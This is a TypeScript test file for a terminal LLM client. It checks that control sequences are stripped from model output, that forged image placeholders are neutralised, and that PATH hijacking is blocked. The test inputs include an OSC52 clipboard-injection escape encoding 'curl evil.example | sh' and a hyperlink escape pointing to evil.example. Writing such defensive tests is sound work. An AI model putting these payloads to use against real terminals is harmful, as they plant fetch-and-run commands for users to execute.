// Text we don't control (model output, LM Studio model ids, filenames) must never carry terminal
// control sequences to the screen, and must not be able to forge inline-image placeholders.
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { delimiter, join } from "node:path";
import { test } from "node:test";
import { findLms } from "../src/llm/local.js";
import { Session } from "../src/llm/session.js";
import type { Backend, RunResult } from "../src/llm/types.js";
import { StreamRenderer } from "../src/ui/markdown.js";
import { expandLine, stripControls, visibleLen } from "../src/ui/text.js";

const CONTROL = /[\x00-\x08\x0b-\x1f\x7f-\x9f]/;
const OSC52 = "\x1b]52;c;" + Buffer.from("curl evil.example | sh").toString("base64") + "\x07";

test("stripControls removes ESC, BEL, CR, C1 and placeholder delimiters; keeps text, \\t and \\n", () => {
  assert.equal(stripControls("a\x1b[2Ab\x07c\rd\u009b2Je7f"), "a[2Abcd2Je7f");
  assert.equal(stripControls("ρ ∇·𝐮 = 0\n\tx̂ ✓"), "ρ ∇·𝐮 = 0\n\tx̂ ✓");
});

test("Session strips control characters from everything a backend relays", async () => {
  const fake: Backend = {
    async run(_turns, _opts, cb): Promise<RunResult> {
      cb.onThinking?.("plan\x1b]0;title\x07");
      cb.onNotice?.("note\x1b]8;;https://evil.example/\x07");
      cb.onText(OSC52);
      cb.onText("\x1b\x07"); // nothing visible left: must not reach the UI at all
      cb.onText("ok \x1b[2K" + "3done");
      return { stopReason: "end_turn", servedBy: "m", aborted: false, costUsd: 0, reply: { text: "x", model: "m" } };
    },
  };
  const s = new Session(fake as never, fake as never);
  const text: string[] = [], think: string[] = [], notes: string[] = [];
  await s.send("q", [], { model: "claude-opus-5-5", effort: "high", showThinking: true, signal: new AbortController().signal }, {
    onText: (d) => text.push(d),
    onThinking: (d) => think.push(d),
    onNotice: (n) => notes.push(n),
  });
  for (const x of [...text, ...think, ...notes]) assert.doesNotMatch(x, CONTROL);
  assert.equal(text.length, 2);
  assert.equal(text[1], "ok [2K3done");
  assert.deepEqual(think, ["plan]0;title"]);
});

test("a forged inline-image placeholder no longer crashes the renderer", () => {
  assert.equal(visibleLen("a999b"), 2);
  assert.equal(expandLine("a999b"), "ab");
  let out = "";
  const caps = { cellW: 10, cellH: 21, cols: 80, fg: "#fff", bg: "#000", graphics: "none" as const, measured: "env" as const };
  const r = new StreamRenderer({ caps, mathScale: 1.5, width: () => 80, write: (x) => (out += x) });
  r.push("text 999 more\n");
  r.end();
  assert.match(out, /text {2}more/);
});

test("findLms never returns a path from a relative PATH entry", () => {
  const root = mkdtempSync(join(tmpdir(), "mathcli-lms-"));
  const cwd = process.cwd();
  const exe = process.platform === "win32" ? "lms.exe" : "lms";
  try {
    for (const d of ["rel", "abs", "home/.lmstudio/bin"]) mkdirSync(join(root, d), { recursive: true });
    writeFileSync(join(root, exe), ""); // planted in the current directory
    writeFileSync(join(root, "rel", exe), "");
    writeFileSync(join(root, "abs", exe), "");
    process.chdir(root);
    const bundled = join(root, "nohome", ".lmstudio", "bin", exe);
    assert.equal(findLms({ PATH: ["rel", "", "."].join(delimiter) }, join(root, "nohome")), bundled);
    assert.equal(findLms({ PATH: ["rel", join(root, "abs")].join(delimiter) }, join(root, "nohome")), join(root, "abs", exe));
    writeFileSync(join(root, "home/.lmstudio/bin", exe), "");
    assert.equal(findLms({ PATH: join(root, "abs") }, join(root, "home")), join(root, "home", ".lmstudio", "bin", exe));
  } finally {
    process.chdir(cwd);
    rmSync(root, { recursive: true, force: true });
  }
});
